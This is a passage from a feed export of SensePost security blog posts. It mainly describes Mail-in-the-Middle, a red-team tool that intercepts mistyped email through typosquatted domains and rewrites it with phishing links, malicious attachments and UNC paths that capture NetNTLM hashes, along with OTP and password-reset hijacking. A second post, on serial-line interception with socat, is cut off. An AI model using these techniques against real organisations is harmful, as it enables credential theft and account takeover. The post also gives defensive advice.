from previous generations of SensePost to us (thank you <a href=\"https://twitter.com/_w_m__\">Willem</a>), and probably has been by many others out there. What we are presenting here is an improvement on the process and the automation of it.&#xA0;</em>&#xA0;</p>\n\n\n\n<p>Back to the point, to achieve a Mail-in-the-Middle position, there are three basic steps:&#xA0;</p>\n\n\n\n<ol start=\"1\">\n<li>Register a good number of typos of the target&#x2019;s domain</li>\n\n\n\n<li>Configure the DNS with the MX record pointing to an attacker-controlled mail server</li>\n\n\n\n<li>Configure a <a href=\"https://tecadmin.net/setup-catch-all-email-account-in-postfix/\" target=\"_blank\" rel=\"noreferrer noopener\">catch-all</a> email address to read all these &#x201C;<em>Stranded Emails</em>&#x201D;.</li>\n</ol>\n\n\n\n<p>I like to call these &#x201C;Stranded Emails&#x201D;, just because I am a fan of <a href=\"https://static.tvtropes.org/pmwiki/pub/images/kojima_stranding.jpg\" target=\"_blank\" rel=\"noreferrer noopener\">Death Stranding</a> and I am not a native English speaker, so I just make up words to sound like an intellectual.&#xA0;</p>\n\n\n\n<p>The architecture of this setup is illustrated in the diagram below: </p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/arch.manual.drawio.png\"><img loading=\"lazy\" decoding=\"async\" width=\"647\" height=\"423\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/arch.manual.drawio.png\" alt=\"\" class=\"wp-image-73326\"></a></figure>\n\n\n\n<p>The green envelope is the original email sent to the wrong domain (mircosoft.com). The handsome hacker would catch that email, extract any sensitive information, if any or modify it and forward on.&#xA0;&#xA0;</p>\n\n\n\n<p>All this sounds a bit cumbersome to do manually. Hence, this is where the tool <strong>Mail-in-the-Middle</strong> can help you, which automates this process.&#xA0;&#xA0;</p>\n\n\n\n<p>Let&#x2019;s dig into how to set up the environment and use the tool.&#xA0;</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Infrastructure Preparation</strong></h2>\n\n\n\n<p>As I&#x2019;ve mentioned before, registering domains that are typo&#x2019;s of the target&#x2019;s domain (mostly domains that you would type if you fat-fingered an email address) is key. There are tools, such as <a href=\"https://github.com/elceef/dnstwist\" target=\"_blank\" rel=\"noreferrer noopener\">dnstwist</a> that can help you with discovering good domains to look at. For example, if the target was mydomain.com, you would register domains like mydoain.com,&#xA0; mydomian.com or mdyomian.com.&#xA0;</p>\n\n\n\n<p>Once we have registered a good number of these domains, we set the MX DNS records of all these domains to point to our mailbox. Following on our earlier example, querying the MX records of the domain using dig would return something like the following (a good tip to check for this if you are on the blue team and suspect something weird is going on!):&#xA0;</p>\n\n\n\n<pre class=\"wp-block-preformatted\">$ dig mydoain.com mx +short\n10 mail.attacker.com.&#xA0;</pre>\n\n\n\n<p>Now, configure a <a href=\"https://tecadmin.net/setup-catch-all-email-account-in-postfix/\" target=\"_blank\" rel=\"noreferrer noopener\">catch-all</a> rule on the server to forward any email coming to a non-existent recipient to another <em>trap </em>email, for example to <a href=\"mailto:blackhole@attacker.com\" target=\"_blank\" rel=\"noreferrer noopener\">blackhole@attacker.com</a>.&#xA0;</p>\n\n\n\n<p>With a catch-all configured, if I go to our servers webmail, I often see plenty of rubbish and spam clogging my inbox. This is a good sign, the catch-all rule is working. You could expect like 5% of these emails to be useful (aka: not spam).&#xA0;</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-50.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"827\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-50-1024x827.png\" alt=\"\" class=\"wp-image-72928\"></a><figcaption class=\"wp-element-caption\">Meeting invite including a passcode and details about the agenda</figcaption></figure>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-49.png\"><img loading=\"lazy\" decoding=\"async\" width=\"906\" height=\"555\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-49.png\" alt=\"\" class=\"wp-image-72927\"></a><figcaption class=\"wp-element-caption\">Invoice for SAP sent to the wrong recipient</figcaption></figure>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Automation</strong></h2>\n\n\n\n<p>The objective of Maitm is to reduce my workload by automating the delivery of the spear-phishing style campaigns at scale.&#xA0;</p>\n\n\n\n<p>The main ingredients of my tool were a handful of <a href=\"https://pypi.org/project/imap-tools/\" target=\"_blank\" rel=\"noreferrer noopener\">imap-tools</a>, a pinch of <a href=\"https://pypi.org/project/discord-webhook/\" target=\"_blank\" rel=\"noreferrer noopener\">discord-webhook</a> and a spoonful of <a href=\"https://pypi.org/project/beautifulsoup4/\" target=\"_blank\" rel=\"noreferrer noopener\">BeautifulSoup4</a>. We mix all this magic in a hot pot and now&#xA0;the attacker can rely on a script to do automatic email modification and forwarding to intended users, all while they are relaxing:&#xA0;</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-51.png\"><img loading=\"lazy\" decoding=\"async\" width=\"647\" height=\"423\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-51.png\" alt=\"\" class=\"wp-image-72929\"></a></figure>\n\n\n\n<p>Simply put, the script is an infinite loop with the following logic:&#xA0;</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-52.png\"><img loading=\"lazy\" decoding=\"async\" width=\"449\" height=\"589\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-52.png\" alt=\"\" class=\"wp-image-72930\"></a></figure>\n\n\n\n<p>Depending on the configuration you have set, the flow should be similar to the following:&#xA0;</p>\n\n\n\n<ol start=\"1\">\n<li>Login to a mailbox via SMTP and IMAP (defined in auth.yml).</li>\n\n\n\n<li>List emails, new or all (defined by the CLI argument -n).</li>\n\n\n\n<li>Filter emails you want (defined in filter.yml)&#xA0;</li>\n\n\n\n<li>Inject a tracking URL (if defined in injections.yml)&#xA0;</li>\n\n\n\n<li>Inject a UNC path as image to exfiltrate NetNTLM hashes (if defined injections.yml)</li>\n\n\n\n<li>Replace/Inject attached files (if defined in injections.yml)</li>\n\n\n\n<li>Replace legitimate links with attacker-controlled links (if defined in injections.yml)</li>\n\n\n\n<li>Fix typos on the destination(s) email address(es) (defined in typos.yml)&#xA0;</li>\n\n\n\n<li>Forward the email to the corrected email address (defined by the CLI argument -f).\n<ul>\n<li>The source of the email can be defined in misc.yml, e.g. <a href=\"mailto:security@mircosoft.com\" target=\"_blank\" rel=\"noreferrer noopener\">security@mircosoft.com</a>.</li>\n\n\n\n<li>The destination can be set to a fixed address in case you want to test before going to production in misc.yml.</li>\n</ul>\n</li>\n\n\n\n<li>Notify the Discord/Teams channel (defined in notifications.yml)</li>\n\n\n\n<li>Repeat the process again with new emails.</li>\n</ol>\n\n\n\n<p>Now that you know the general flow and functionality of Maitm, you just need it to run.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Running Maitm</strong></h2>\n\n\n\n<p>The usage of the script requires you to tweak the yaml formatted configuration file (config/config.yml). This file contains the name of other files with a subset of configurations, such as &#x201C;auth.yml&#x201D;, &#x201C;filter.yml&#x201D;, &#x201C;typos.yml&#x201D;, &#x201C;injections.yml&#x201D;, etc. By editing these configuration files you would be able to adapt the tool to your needs as described before. For the full details of how to configure and run the tool, refer to the <a href=\"https://github.com/sensepost/mail-in-the-middle\" target=\"_blank\" rel=\"noreferrer noopener\">github</a> project <a href=\"https://github.com/sensepost/mail-in-the-middle/-/blob/main/README.md\" target=\"_blank\" rel=\"noreferrer noopener\">README</a>.&#xA0;</p>\n\n\n\n<p>Once configured, there are two ways you can run the tool, either by creating the virtual environment with pipenv or running it via Docker. Using it via Docker would be as easy as executing:&#xA0;</p>\n\n\n\n<pre class=\"wp-block-preformatted\">docker build -t maitm .&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; # Build&#xA0;<br>docker run --rm -ti maitm -h # To get help&#xA0;<br>docker run --rm -ti maitm -c config/config.yml -f &#x2013;n</pre>\n\n\n\n<h2 class=\"wp-block-heading\">Results</h2>\n\n\n\n<p>When you run Maitm on your server, you should see something like this in the console:&#xA0;</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/blurred-maitm-1.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"352\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/blurred-maitm-1-1024x352.png\" alt=\"\" class=\"wp-image-73431\"></a><figcaption class=\"wp-element-caption\">Running Maitm</figcaption></figure>\n\n\n\n<p>When an email is forwarded and you have configured Discord or Teams, you will receive a message like this when some activity happens:&#xA0;</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-77.png\"><img loading=\"lazy\" decoding=\"async\" width=\"637\" height=\"474\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-77.png\" alt=\"\" class=\"wp-image-73429\"></a><figcaption class=\"wp-element-caption\">Discord notifications of forwarded emails with a summary of the result</figcaption></figure>\n\n\n\n<p>I also created <a href=\"https://github.com/sensepost/mail-in-the-middle/blob/main/tracking-pixel-bell.py\" target=\"_blank\" rel=\"noreferrer noopener\">another script</a> to report a hit from a tracking pixel via Discord. For it to work you need to install the Apache <a href=\"https://httpd.apache.org/docs/2.4/mod/mod_log_forensic.html\" target=\"_blank\" rel=\"noreferrer noopener\">mod forensics</a> module and modify the path of your log file (variable LOG_FILE) where the script watching. You also need to create an .env file containing the discord webhook URL in the DISCORD_WEBHOOK variable.&#xA0;</p>\n\n\n\n<p>Leave this script running in background and when a recipient receives a email (and if the user allowed remote content to be displayed in the email client) you should get a hit on your tracking pixel and will be notified like this:&#xA0;</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-55.png\"><img loading=\"lazy\" decoding=\"async\" width=\"628\" height=\"547\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-55.png\" alt=\"\" class=\"wp-image-72933\" style=\"width:610px;height:auto\"></a><figcaption class=\"wp-element-caption\">Discord notification of a tracking pixel injected in a forwarded email being rendered in the target&#x2019;s mail client.</figcaption></figure>\n\n\n\n<p>If you are lucky, after every one of these notifications, you will receive a NetNTLM hash on your server and, hoping the recipient has executed your attachment (assuming you&#x2019;ve configured that), a new agent connection to your C2 infrastructure.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/leaking-hashes-maitm-blur.png\"><img loading=\"lazy\" decoding=\"async\" width=\"869\" height=\"484\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/leaking-hashes-maitm-blur.png\" alt=\"\" class=\"wp-image-73433\"></a><figcaption class=\"wp-element-caption\">Target&#x2019;s point of view when opening our mail with the UNC path injected&#xA0;</figcaption></figure>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-76.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"192\" src=\"https://sensepost.com/img/pages/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/image-76-1024x192.png\" alt=\"\" class=\"wp-image-73423\"></a><figcaption class=\"wp-element-caption\">NetNTLM hashes exfiltrated via UNC path injected in the tainted email</figcaption></figure>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Conclusions</strong>&#xA0;</h2>\n\n\n\n<p>When we think about the security implications of typo&#x2019;d domains, we immediately think of phishing sent <strong>from</strong> that domain to our business, but we forget about the implications of the emails sent <strong>to </strong>that typo&#x2019;d  domain.&#xA0;&#xA0;</p>\n\n\n\n<p>Setting up infrastructure that catches &#x201C;stranded emails&#x201D; as an attacker is a powerful attack piivimite. The emails sent to these domains often contain a trove of sensitive data, which could include Personally Identifiable Information (PII), business infrastructure information, business meeting invites, bills, etc. Attackers can take advantage of this to great effect by performing many actions such as completing employee enrolments or password resets on specific business-owned platforms, effectively leading to account takeovers. In my last Red Team we had good success with this, and almost surely you can put it in practice in yours as well.</p>\n\n\n\n<p>Having a tool deal with &#x201C;stranded email&#x201D; monitoring, link and attachment replacement and more takes a significant workload off your shoulders, leaving you with more time to focus on other aspects of your testing.&#xA0;That, and sometimes when email delivery is fast (right after clicking that password reset button), it&#x2019;s less suspicious :)</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Recommendations</strong>&#xA0;</h2>\n\n\n\n<p>Mitigating these kinds of attacks, from a business perspective, requires a multi-faceted approach. It&#x2019;s not always possible to prevent human errors when typing email addresses or registering people in third-party web applications linked with your business. Some procedures and mechanisms to consider include:&#xA0;</p>\n\n\n\n<ul>\n<li>Frequent validation of data, specifically email address, of registered employees on third-party applications. Consider having a procedure for administrators of applications that describes that responsibility.&#xA0;</li>\n\n\n\n<li>Implement domain and user impersonation protection mechanisms on your email provider. For example, Microsoft has specific settings in their anti-phishing for <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-phishing-policies-about?view=o365-worldwide#impersonation-settings-in-anti-phishing-policies-in-microsoft-defender-for-office-365\" target=\"_blank\" rel=\"noreferrer noopener\">user and domain impersonation</a>.&#xA0;</li>\n\n\n\n<li>All the recommendations that apply to typo squatting, also apply here:&#xA0;\n<ul>\n<li>Monitor domains similar to yours. For this attack, if an attacker defined an MX record for a similar domain, they are most likely receiving emails you were supposed to be receiving! Request a take-down of that domain.&#xA0;</li>\n\n\n\n<li>There are <a href=\"https://github.com/topics/typosquatting\" target=\"_blank\" rel=\"noreferrer noopener\">plenty of open-source projects on github</a> to help with monitoring, as well as commercial solutions.</li>\n\n\n\n<li>Register and park domains similar to yours, keeping them to prevent attackers from registering these themselves. Costs may be a concern, so focus only on the few most likely to be mistyped.&#xA0;&#xA0;</li>\n</ul>\n</li>\n</ul>\n\n\n\n<ul>\n<li>The longer your business domain is, the higher the chance of a typo. An obvious mitigation would be to have a shorter domain name. Of course, this is hard to apply in hindsight. You are not going to change the name of your company just because you want a shorter domain name, or the company brand policy prevents this. Instead, an alternative option would be to register a shorthand for your domain for email communications. For example, registering ms.com for microsoft.com and encouraging using the shorter version for email communications and user registration in third-party provider applications.&#xA0;&#xA0;</li>\n\n\n\n<li>Usual recommendations to protect your business against spear phishing campaigns also apply here. These range from continuous phishing simulation campaigns, employee awareness training, and clear procedures and mechanisms to report real phishing to the security team internally.</li>\n</ul>\n\n\n\n<p>Use the tool in your engagements and <a href=\"https://defcon.social/@felmoltor\" target=\"_blank\" rel=\"noreferrer noopener\">let me know how it goes.</a>&#xA0;&#xA0;</p>\n\n\n\n<p>Happy hunting!&#xA0;</p>\n",
      "content:encodedSnippet": "Context\nIn the chilly month of December 2023, my colleagues Jason (@BreakerOfSigns), Szymon (@TH3_GOAT_FARM3R), and myself (@felmoltor) were on a red team. This one was tough, but we had fun. We had to be a bit more creative than I am used to and two interesting things were done that are worth sharing: \nSzymon and Jason physically broke into the client’s facilities. At a branch office, they left an implant using Rogan’s “Slimjim” device and it proved to be a solid and production ready project. Try it out and let us know how it goes. \nI developed a tool that we named Mail-in-the-Middle (Maitm for short). You can find it in our Github repository here: https://github.com/sensepost/mail-in-the-middle. \nI cannot speak in first person about the physical breakin beyond praising the excellent social engineering skills of both of my colleagues, but I can talk about Mail-in-the-Middle. \nFirst, let me explain what is Mail-in-the-Middle and how we approached it. \nWhat is Maitm? \n\nThe idea is simple; take advantage of the typos that people make when they enter email addresses. If we positioned ourselves in between the sender of an email (be it a person or a system) and the legitimate recipient, we may be able to capture plenty of information about the business, including personally identifiable information, email verification processes, etc. This scenario is effectively a Person-in-the-Middle (PiTM), but for email communications. \nSome examples of how being positioned in the middle of email communications could be useful include: \nA vendor or third party would like to send out an invoice to the finance department of the target but they typo’d the domain. An attacker who owns the typo’d domain would receive these mails disclosing whatever information was contained within. This provides the attacker with a good pretext for a social engineering attack.\nLet’s say an administrator sets up a service to monitor performance of their servers, and proceeded to configure notifications / alarms to be sent to an email address where there was a typo within the domain. An attacker would receive those notifications which might disclose useful information about their internal infrastructure (for instance, software used, hostnames, IP addresses, etc.). \nOr perhaps an employee, from HR, registered an account on a third party service used to manage candidates applying for a job. But this was done using an email address where the domain was typo’d. Should the third party service send an email to that account, it would land in the hands of the attackers. An attacker could potentially perform an account takeover by requesting a password reset.  \nWhat if an attacker finds that they were receiving OTP’s for an account registration. In this scenario, they could take advantage of this by actively forwarding on these emails on to the corrected target. This would give the attacker the ability to hijack the account later on should the victim user complete the registration process using the forwarded OTP. \nA more active approach could be taken by tainting all the emails coming in and forwarding them on to the legitimate recipient. Links can be modified to point to a phishing page, UNC paths can also be injected as images on the email or mail headers (see CVE-2023-35636) to exfiltrate NetNTLM hashes, or attachments can be injected to deliver your malicious payload. \nIn summary, doing this would be similar to receiving an Amazon package wrongly delivered to you, swapping the Rolex inside the package with the Casio, repackaging it, and leaving the parcel on your neighbours doorstep (hoping they don’t notice).  \nThe original idea of doing this mail interception manually was not ours (Szymon, Jason, or Felipe), but it was rather passed down from previous generations of SensePost to us (thank you Willem), and probably has been by many others out there. What we are presenting here is an improvement on the process and the automation of it.  \nBack to the point, to achieve a Mail-in-the-Middle position, there are three basic steps: \nRegister a good number of typos of the target’s domain\nConfigure the DNS with the MX record pointing to an attacker-controlled mail server\nConfigure a catch-all email address to read all these “Stranded Emails”.\nI like to call these “Stranded Emails”, just because I am a fan of Death Stranding and I am not a native English speaker, so I just make up words to sound like an intellectual. \nThe architecture of this setup is illustrated in the diagram below: \n\n\n\n\nThe green envelope is the original email sent to the wrong domain (mircosoft.com). The handsome hacker would catch that email, extract any sensitive information, if any or modify it and forward on.  \nAll this sounds a bit cumbersome to do manually. Hence, this is where the tool Mail-in-the-Middle can help you, which automates this process.  \nLet’s dig into how to set up the environment and use the tool. \nInfrastructure Preparation\nAs I’ve mentioned before, registering domains that are typo’s of the target’s domain (mostly domains that you would type if you fat-fingered an email address) is key. There are tools, such as dnstwist that can help you with discovering good domains to look at. For example, if the target was mydomain.com, you would register domains like mydoain.com,  mydomian.com or mdyomian.com. \nOnce we have registered a good number of these domains, we set the MX DNS records of all these domains to point to our mailbox. Following on our earlier example, querying the MX records of the domain using dig would return something like the following (a good tip to check for this if you are on the blue team and suspect something weird is going on!): \n$ dig mydoain.com mx +short\n10 mail.attacker.com. \nNow, configure a catch-all rule on the server to forward any email coming to a non-existent recipient to another trap email, for example to blackhole@attacker.com. \nWith a catch-all configured, if I go to our servers webmail, I often see plenty of rubbish and spam clogging my inbox. This is a good sign, the catch-all rule is working. You could expect like 5% of these emails to be useful (aka: not spam). \nMeeting invite including a passcode and details about the agenda\n\n\n\nInvoice for SAP sent to the wrong recipient\n\n\n\nAutomation\nThe objective of Maitm is to reduce my workload by automating the delivery of the spear-phishing style campaigns at scale. \nThe main ingredients of my tool were a handful of imap-tools, a pinch of discord-webhook and a spoonful of BeautifulSoup4. We mix all this magic in a hot pot and now the attacker can rely on a script to do automatic email modification and forwarding to intended users, all while they are relaxing: \n\n\n\n\nSimply put, the script is an infinite loop with the following logic: \n\n\n\n\nDepending on the configuration you have set, the flow should be similar to the following: \nLogin to a mailbox via SMTP and IMAP (defined in auth.yml).\nList emails, new or all (defined by the CLI argument -n).\nFilter emails you want (defined in filter.yml) \nInject a tracking URL (if defined in injections.yml) \nInject a UNC path as image to exfiltrate NetNTLM hashes (if defined injections.yml)\nReplace/Inject attached files (if defined in injections.yml)\nReplace legitimate links with attacker-controlled links (if defined in injections.yml)\nFix typos on the destination(s) email address(es) (defined in typos.yml) \nForward the email to the corrected email address (defined by the CLI argument -f).\n\nThe source of the email can be defined in misc.yml, e.g. security@mircosoft.com.\nThe destination can be set to a fixed address in case you want to test before going to production in misc.yml.\nNotify the Discord/Teams channel (defined in notifications.yml)\nRepeat the process again with new emails.\nNow that you know the general flow and functionality of Maitm, you just need it to run.\nRunning Maitm\nThe usage of the script requires you to tweak the yaml formatted configuration file (config/config.yml). This file contains the name of other files with a subset of configurations, such as “auth.yml”, “filter.yml”, “typos.yml”, “injections.yml”, etc. By editing these configuration files you would be able to adapt the tool to your needs as described before. For the full details of how to configure and run the tool, refer to the github project README. \nOnce configured, there are two ways you can run the tool, either by creating the virtual environment with pipenv or running it via Docker. Using it via Docker would be as easy as executing: \ndocker build -t maitm .       # Build \ndocker run --rm -ti maitm -h # To get help \ndocker run --rm -ti maitm -c config/config.yml -f –n\nResults\nWhen you run Maitm on your server, you should see something like this in the console: \nRunning Maitm\n\n\n\nWhen an email is forwarded and you have configured Discord or Teams, you will receive a message like this when some activity happens: \nDiscord notifications of forwarded emails with a summary of the result\n\n\n\nI also created another script to report a hit from a tracking pixel via Discord. For it to work you need to install the Apache mod forensics module and modify the path of your log file (variable LOG_FILE) where the script watching. You also need to create an .env file containing the discord webhook URL in the DISCORD_WEBHOOK variable. \nLeave this script running in background and when a recipient receives a email (and if the user allowed remote content to be displayed in the email client) you should get a hit on your tracking pixel and will be notified like this: \nDiscord notification of a tracking pixel injected in a forwarded email being rendered in the target’s mail client.\n\n\n\nIf you are lucky, after every one of these notifications, you will receive a NetNTLM hash on your server and, hoping the recipient has executed your attachment (assuming you’ve configured that), a new agent connection to your C2 infrastructure.\nTarget’s point of view when opening our mail with the UNC path injected \n\n\n\nNetNTLM hashes exfiltrated via UNC path injected in the tainted email\n\n\n\nConclusions \nWhen we think about the security implications of typo’d domains, we immediately think of phishing sent from that domain to our business, but we forget about the implications of the emails sent to that typo’d  domain.  \nSetting up infrastructure that catches “stranded emails” as an attacker is a powerful attack piivimite. The emails sent to these domains often contain a trove of sensitive data, which could include Personally Identifiable Information (PII), business infrastructure information, business meeting invites, bills, etc. Attackers can take advantage of this to great effect by performing many actions such as completing employee enrolments or password resets on specific business-owned platforms, effectively leading to account takeovers. In my last Red Team we had good success with this, and almost surely you can put it in practice in yours as well.\nHaving a tool deal with “stranded email” monitoring, link and attachment replacement and more takes a significant workload off your shoulders, leaving you with more time to focus on other aspects of your testing. That, and sometimes when email delivery is fast (right after clicking that password reset button), it’s less suspicious :)\nRecommendations \nMitigating these kinds of attacks, from a business perspective, requires a multi-faceted approach. It’s not always possible to prevent human errors when typing email addresses or registering people in third-party web applications linked with your business. Some procedures and mechanisms to consider include: \nFrequent validation of data, specifically email address, of registered employees on third-party applications. Consider having a procedure for administrators of applications that describes that responsibility. \nImplement domain and user impersonation protection mechanisms on your email provider. For example, Microsoft has specific settings in their anti-phishing for user and domain impersonation. \nAll the recommendations that apply to typo squatting, also apply here: \n\nMonitor domains similar to yours. For this attack, if an attacker defined an MX record for a similar domain, they are most likely receiving emails you were supposed to be receiving! Request a take-down of that domain. \nThere are plenty of open-source projects on github to help with monitoring, as well as commercial solutions.\nRegister and park domains similar to yours, keeping them to prevent attackers from registering these themselves. Costs may be a concern, so focus only on the few most likely to be mistyped.  \nThe longer your business domain is, the higher the chance of a typo. An obvious mitigation would be to have a shorter domain name. Of course, this is hard to apply in hindsight. You are not going to change the name of your company just because you want a shorter domain name, or the company brand policy prevents this. Instead, an alternative option would be to register a shorthand for your domain for email communications. For example, registering ms.com for microsoft.com and encouraging using the shorter version for email communications and user registration in third-party provider applications.  \nUsual recommendations to protect your business against spear phishing campaigns also apply here. These range from continuous phishing simulation campaigns, employee awareness training, and clear procedures and mechanisms to report real phishing to the security team internally.\nUse the tool in your engagements and let me know how it goes.  \nHappy hunting!",
      "content": "Context\n\n",
      "contentSnippet": "Context",
      "guid": "https://sensepost.com/blog/2024/mail-in-the-middle-a-tool-to-automate-spear-phishing-campaigns/",
      "isoDate": "2024-02-26T14:32:27.000Z",
      "itunes": {}
    },
    {
      "title": "Serial PitM",
      "link": "https://sensepost.com/blog/2024/serial-pitm/",
      "pubDate": "Tue, 06 Feb 2024 15:04:48 +0000",
      "content:encoded": "<p>Sometimes you need to get in the way of a hardware device and its controller, and see what it has to say for itself. If you are lucky, the two parts are communicating using a serial port, and then it&#x2019;s relatively simple to do. In this post, I will explain two scenarios where I had to do this, and the approach that I took in each. As a bonus, I&#x2019;ll also show some hardware that I put together to make it easier.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Scenario 1: IoT authorisation dongle</h2>\n\n\n\n<p>In this scenario, I was trying to connect to an IoT device. This particular device listened for a specific WiFi SSID beacon, then tried to connect with a calculated PSK. The calculation was performed on a PC, but required a connected dongle to provide part of the calculation. Unplugging the dongle from the controller PC, and plugging it into my own computer&#x2019;s USB port, I could see that it enumerated as an FTDI serial device. Keeping in mind that I don&#x2019;t control the controller PC, and I don&#x2019;t control the dongle, what do?</p>\n\n\n\n<p>Fortunately, I happened to have another FTDI USB Serial cable with me, that enumerated sufficiently similar to the dongle that the controller software was happy to talk to it. That gets me a third of the way there!</p>\n\n\n\n<p>This is actually quite a valuable technique &#x2013; present a device to the controller that looks sufficiently similar to what it is expecting that it will use it, but that we can see what it is doing. There are a couple of things to keep in mind, though. For some devices, you can update the VendorID:ProductID that is stored in EEPROM so that it matches the real device. e.g. using <a href=\"https://manpages.debian.org/testing/ftdi-eeprom/ftdi_eeprom.1.en.html\" target=\"_blank\" rel=\"noreferrer noopener\">ftdi_eeprom</a> on Linux. However, it will use the driver associated with that VID:PID to talk to it! So, you probably won&#x2019;t be successful making a PL2303 serial device report itself as an FTDI serial device, because they use different drivers. In fact, I once managed to make an ATM bluescreen itself by making a Linux Serial Gadget report itself as an FTDI device! Nonetheless, since FTDI devices in particular have reprogrammable EEPROMs, it&#x2019;s not unusual for device manufacturers to customise the VID:PID to make them uniquely identifiable, even if they still use the generic FTDI driver. You can then do the same using freely available tools, if you have a suitable substitute to hand.</p>\n\n\n\n<p>The next step was seeing what the controller was saying to the serial cable. Fortunately, I had a second USB Serial cable with me, so I could get the data back into a PC (well, device running Linux, anyway!). I connected the TX of one cable to the RX of the other, and vice versa, and connected the two Ground pins together. Then I could use a serial terminal program like picocom to see what the controller was sending, and try to figure out the baud rate. Note that the second USB Serial cable didn&#x2019;t have to be an FTDI specifically, since it was only the controller PC that cared what sort of device it was talking to.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/Back2Back-scaled.jpg\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"566\" src=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/Back2Back-1024x566.jpg\" alt=\"\" class=\"wp-image-73997\"></a><figcaption class=\"wp-element-caption\">Two FTDI USB-UART adapters configured in a crossover configuration.</figcaption></figure>\n\n\n\n<p>I ran the controller program a few times while looking at the serial terminal emulator, and changed the baud rate until what I saw seemed reasonable. Unsurprisingly, the correct baud rate turned out to be 115200, probably the most common rate for relatively modern devices. Older devices with low bandwidth requirements will often stick with 9600 baud. 2/3rds of the way there!</p>\n\n\n\n<p>Of course, seeing the initial conversation attempts with the controller application doesn&#x2019;t really get you too far, without being able to respond with the data it is expecting. I plugged the dongle into my Linux PC as well, so I could relay the data that the controller was sending to the real dongle.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>socat -x /dev/ttyUSB0,raw,echo=0,b115200 /dev/ttyUSB1,raw,echo=0,b115200 2&gt;&amp;1 | tee serial.log</code></pre>\n\n\n\n<p>Breaking that down, socat is the swiss army knife of forwarders, and the -x option tells it to dump whatever it forwards in hex format. The two following arguments are the source and destination, in this case the device /dev/ttyUSB0 or ttyUSB1, doing no processing of the data (&#x201C;raw&#x201D;), and not echoing any data it receives to the original sender. (An echo can be useful for a cli, so the person typing can see what they have typed, but it is not useful for a machine that is not expecting it.) The hex dump output is then logged in serial.log where we can review it later, but also printed to the screen, so we can see that data is actually passing in both directions.</p>\n\n\n\n<p>With that running, I queried the controller program to discover the PSK for the IoT device, and was able to capture the conversation with the dongle. From there, it becomes an exercise in reverse engineering the protocol, and trying to make sense of it. In this case, I was ultimately unsuccessful, as it was a binary protocol, I didn&#x2019;t have a lot of time, and this wasn&#x2019;t really a focus of my assessment anyway.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-20.png\"><img loading=\"lazy\" decoding=\"async\" width=\"959\" height=\"1024\" src=\"https://sensepost.com/img/pages/blog/2024/serial-pitm/image-20-959x1024.png\" alt=\"\" class=\"wp-image-74017\"></a><figcaption class=\"wp-element-caption\">Example output from intercepting Forscan talking to an ELM327 dongle using the same technique. This was done by relaying the socat connection over the Internet, because it&#x2019;s possible, and also because I didn&#x2019;t have the dongle with me. This is an instance where the fixed baud rate became a problem, because Forscan tries to upgrade the baud rate where possible, and socat can&#x2019;t deal with that. Updating the Forscan config to not change 